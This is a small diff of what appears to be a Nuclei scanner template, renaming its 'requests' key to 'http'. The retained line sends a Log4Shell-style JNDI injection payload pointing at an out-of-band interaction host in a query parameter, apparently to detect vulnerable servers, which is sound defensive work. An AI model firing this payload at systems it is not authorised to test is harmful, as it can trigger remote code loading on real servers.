@@ -5,7 +5,7 @@ info:
   author: ELSFA7110
   severity: high
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?test=${jndi:ldap://{{interactsh-url}}/a}"
